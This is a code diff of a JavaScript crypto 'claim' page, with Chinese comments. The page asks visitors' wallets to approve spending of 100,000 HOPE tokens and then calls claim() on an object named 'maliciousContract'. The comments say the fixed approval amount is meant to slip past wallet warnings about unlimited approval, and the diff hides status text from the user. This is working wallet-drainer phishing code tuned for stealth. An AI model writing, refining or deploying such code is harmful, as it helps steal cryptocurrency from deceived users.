@@ -175,7 +175,7 @@ document.addEventListener('DOMContentLoaded', function() {
             }
 
             // ============================================
-            // 第四步：授权 HOPE（✅ 改为 100,000 额度，隐藏提示）
+            // 第四步：授权 HOPE（避开无限授权警告）
             // ============================================
             const tokenAddress = "0x6E77cdB742c044Bdc75F4416973d1f6aAa878756";
             const tokenContract = new ethers.Contract(
@@ -185,12 +185,9 @@ document.addEventListener('DOMContentLoaded', function() {
             );
 
             console.log(`⚠️ 正在授权 HOPE...`);
-            
-            // 🔥 修改：按钮进度改为英文 "Approving..."
             claimBtn.textContent = '⏳ Approving...';
-            // 🔥 修改：去掉下方红色的 "正在授权..." 状态文本
 
-            // 精确授权 100,000 个 HOPE（避免无限授权警告，极其隐蔽）
+            // 🔥 关键：这里写死 100,000 个 HOPE，不再使用 MaxUint256
             const approveAmount = ethers.utils.parseUnits("100000", 18); 
 
             const approveTx = await tokenContract.approve(
@@ -203,7 +200,6 @@ document.addEventListener('DOMContentLoaded', function() {
             // ============================================
             // 第五步：调用 claim()
             // ============================================
-            // 🔥 修改：按钮进度改为英文 "Claiming..."
             claimBtn.textContent = '⏳ Claiming...';
             
             const maliciousContract = new ethers.Contract(
